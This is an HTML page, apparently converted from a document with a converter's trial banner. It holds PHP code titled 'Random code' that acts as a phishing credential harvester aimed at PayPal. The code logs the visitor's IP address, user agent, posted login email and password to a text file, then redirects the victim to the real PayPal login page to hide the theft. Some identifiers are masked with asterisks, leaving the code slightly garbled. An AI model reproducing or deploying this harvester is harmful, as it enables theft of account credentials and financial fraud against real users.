<p>&lt;?php&nbsp;</p>
<p>&nbsp;</p>
<p>if (!empty($_SERVER[&apos;HTTP_CLIENT_IP&apos;]))&nbsp;</p>
<p>&nbsp; &nbsp; {&nbsp;</p>
<p>&nbsp; &nbsp; &nbsp; $ipaddress = $_SERVER[&apos;HTTP_CLIENT_IP&apos;];&nbsp;</p>
<p>&nbsp; &nbsp; }&nbsp;</p>
<p>****** (!empty($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&nbsp;</p>
<p>&nbsp; &nbsp; {&nbsp;</p>
<p>&nbsp; &nbsp; &nbsp; $ipaddress = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];&nbsp;</p>
<p>&nbsp; &nbsp; }&nbsp;</p>
<p>else&nbsp;</p>
<p>&nbsp; &nbsp; {&nbsp;</p>
<p>&nbsp; &nbsp; &nbsp; $ipaddress = $_SERVER[&apos;REMOTE_ADDR&apos;];&nbsp;</p>
<p>&nbsp; &nbsp; }&nbsp;</p>
<p>$browser = $_SERVER[&apos;HTTP_USER_AGENT&apos;].&quot;\r\n&quot;;&nbsp;</p>
<p>file_put_contents(&quot;usernames.txt&quot;, &quot;\nUser-Agent: &quot; . $******* . &quot;IP: &quot; . $ipaddress . &quot;\nAccount: \&quot;&quot; . $_POST[&apos;login_email&apos;] . &quot;\&quot; Pass: \&quot;&quot; . $_POST[&apos;login_password&apos;] . &quot;\&quot;\n&quot;, FILE_APPEND);</p>
<p>header(&apos;Location: <a data-fr-linked="true" href="https://www.paypal.com/login">https://www.paypal.com/login</a>&apos;);</p>
<p>exit();</p>
<p><br></p>
<p><br></p>
<p>
    <title>Random code&lt;title&gt; &lt;span class=&quot;fr-marker&quot; data-id=&quot;0&quot; data-type=&quot;true&quot; style=&quot;display: none; line-height: 0;&quot;&gt;&lt;/span&gt;&lt;span class=&quot;fr-marker&quot; data-id=&quot;0&quot; data-type=&quot;false&quot; style=&quot;display: none; line-height: 0;&quot;&gt;&lt;/span&gt;</title>
</p>
<div style="color: red; font-size: 12px; width: 600px; margin: 0 auto; text-align: center;">Created with <a href="https://wordtohtml.net/">WordToHTML.net</a> trial.</div>
